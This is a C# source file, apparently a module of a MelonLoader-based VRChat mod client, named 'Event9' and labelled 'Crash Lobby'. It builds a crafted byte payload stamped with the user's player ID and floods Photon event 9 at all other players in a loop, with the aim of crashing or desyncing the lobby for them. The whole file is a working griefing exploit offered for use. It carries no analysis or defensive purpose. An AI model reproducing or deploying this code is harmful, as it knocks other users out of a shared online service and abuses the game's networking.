using Area51.SDK.Photon;
using ExitGames.Client.Photon;
using MelonLoader;
using System;
using System.Collections;
using UnityEngine;

namespace Area51.Module.Exploit
{
    class Event9 : BaseModule
    {
        public Event9() : base("Event9", "Crash Lobby", Main.Instance.Eventexploitbutton, null, true) { }

        public override void OnEnable()
        {
            MelonCoroutines.Start(Desync());
        }


        IEnumerator Desync()
        {
            byte[] LagData = new byte[] { 65, 13, 3, 0, 0, 0, 0, 0, 20, 200, 0, 0, 0, 0, 0, 13, 0, 0, 0, 13, 0, 0, 4, 16, 1, 6, 0, 0, 48, 0, 0, 4, 0, 0, 0, 0, 3, 3, 13, 0, 0, 8, 0, 68, 0, 12, 0, 65, 65, 1, 0, 1, 0, 0, 0, 0, 12, 1, 0, 0, 0, 0, 0, 8, 0, 65, 0, 13, 0, 0, 8, 3, 65, 3, 0, 126, 12, 0, 0, 4, 0, 0, 0, 58, 0, 65, 0, 1, 2, 9 };
            int idfirst2 = int.Parse(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId + "00001");
            byte[] IDOut2 = BitConverter.GetBytes(idfirst2);
            Buffer.BlockCopy(IDOut2, 0, LagData, 0, 4);
            while (this.toggled)
            {
                for (int i = 0; i < 80; i++)
                {
                    PhotonExtensions.OpRaiseEvent(9, LagData, new Photon.Realtime.RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others,
                        field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache
                    }, SendOptions.SendReliable);
                }
                yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }
    }
}
